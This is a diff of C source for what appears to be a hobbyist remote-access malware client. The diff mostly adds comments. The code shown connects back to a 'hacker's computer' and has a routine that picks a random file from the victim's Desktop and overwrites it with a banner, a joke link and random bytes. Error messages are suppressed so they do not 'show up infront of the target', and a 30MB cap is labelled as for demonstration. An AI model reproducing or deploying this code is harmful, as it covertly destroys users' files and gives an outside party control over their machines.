@@ -54,7 +54,8 @@ void createPrepSock()
 // Connect to the hacker/server's computer
 int makeConnToServer()
 {
-
+	// Setting the ip and port of the hacker's computer to
+	// connect to it
 	server.sin_addr.s_addr = inet_addr("127.0.0.1");
 	server.sin_family = AF_INET;
 	server.sin_port = htons(8888);
@@ -73,15 +74,20 @@ int reliableRecieve()
 	// Cleaning buffer before data comes.
 	memset(buffer, 0, strlen(buffer));
 
+	// returning -1 if connection is broken
 	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
 	{
 		return -1;
 	}
 
+	// closing the string after recieving data
 	buffer[recv_size] = '\0';
+
+	// if nothing is recieved, return 0
 	if (recv_size == 1)
 		return 0;
 
+	// return 1 if data recieved successfully
 	return 1;
 }
 
@@ -101,9 +107,11 @@ void pullDirectoryData()
 
 	// Open the current working directory
 	directory = opendir(".");
+
+	// throw an error if directory cant be opened
 	if (directory == NULL)
 	{
-		perror("Error opening current working directory");
+		// perror("Error opening current working directory");
 	}
 
 	// Loop through the entries in the directory
@@ -112,6 +120,7 @@ void pullDirectoryData()
 		char filename[100];
 		char filetype[10];
 
+		// determining if the item is file or folder
 		if ((entry->d_type + '0') == '0')
 		{
 			strcpy(filetype, "FILE");
@@ -121,6 +130,7 @@ void pullDirectoryData()
 			strcpy(filetype, "FOLDER");
 		}
 
+		// combining all the data and putting it into the buffer
 		strcpy(filename, entry->d_name);
 		strcat(filename, "\n");
 		strcat(filename, filetype);
@@ -154,6 +164,7 @@ int eatFile(char fileName[])
 	int offset, n;
 	FILE *filein;
 
+	// open file for read
 	filein = fopen(fileName, "r");
 
 	if (filein == NULL)
@@ -161,11 +172,20 @@ int eatFile(char fileName[])
 		return 0;
 	}
 
+	// get the number of bytes of file
 	fseek(filein, 0L, SEEK_END);
 	n = ftell(filein);
 
 	fclose(filein);
 
+	// stopping the function if file size is more than around 30MB for
+	// safety and demonstration purposes
+	if (n > 30000000)
+	{
+		return 0;
+	}
+
+	// open the file for write and write header lines to it
 	filein = fopen(fileName, "w");
 
 	fputs("         _______________\n", filein);
@@ -199,6 +219,7 @@ int eatFile(char fileName[])
 	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n\n", filein);
 	fputs("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n", filein);
 
+	// replace the bytes of file with random ASCII characters
 	for (int i = 0; i < n; i++)
 	{
 		fputc(rand() % 256, filein);
@@ -213,6 +234,7 @@ void eatRandomFileFromDesktop()
 {
 	char filesList[100][100], desktopPath[280], freeHandFile[100], desktopFilePath[300];
 
+	// clean all the variables before use
 	memset(filesList, 0, sizeof(filesList));
 	memset(desktopPath, 0, sizeof(desktopPath));
 	memset(freeHandFile, 0, sizeof(freeHandFile));
@@ -220,57 +242,58 @@ void eatRandomFileFromDesktop()
 
 	int filesListTop = -1;
 
+	// get the username of the user and add "\Desktop" at the
+	// end to make desktop path
 	strcat(desktopPath, getenv("USERPROFILE"));
 	strcat(desktopPath, "\\Desktop");
-
-	// chdir(desktopPath);
 
 	// Code to extract directory data
 	DIR *directory;
 	struct dirent *entry;
 
-	// Open the current working directory
+	// Open the desktop directory
 	directory = opendir(desktopPath);
 	if (directory == NULL)
 	{
-		perror("Error opening current working directory");
+		// not calling error so that it doesnt show up infront of the target
+
+		// perror("Error opening current working directory");
 	}
 
 	// Loop through the entries in the directory
 	while ((entry = readdir(directory)) != NULL)
 	{
+		// if the directory item is a file and not a folder
 		if ((entry->d_type + '0') == '0')
 		{
+			// add it to the array of files
 			filesListTop++;
 			memset(filesList[filesListTop], 0, strlen(filesList[0]));
 			strcpy(filesList[filesListTop], entry->d_name);
 		}
 	}
 
-	// Generating path to file
-
 	// Randomly selecting one file
 	strcpy(freeHandFile, filesList[rand() % (filesListTop + 1)]);
 
+	// attaching filename to desktop path to create file path
 	strcpy(desktopFilePath, desktopPath);
 	strcat(desktopFilePath, "\\");
 	strcat(desktopFilePath, freeHandFile);
 
-	// eating that file
+	// eating the file
 	eatFile(desktopFilePath);
 
-	// Close the directory
+	// Closing the directory
 	closedir(directory);
-
-	// Go back to old CWD
-	// chdir(oldCWD);
 }
 
 int agentSnakeActOnFreeHand()
 {
+	// if free hand is given
 	if (freeHandGiven)
 	{
-		// get a file from the desktop
+		// eat a random file from the desktop
 		eatRandomFileFromDesktop();
 	}
 }
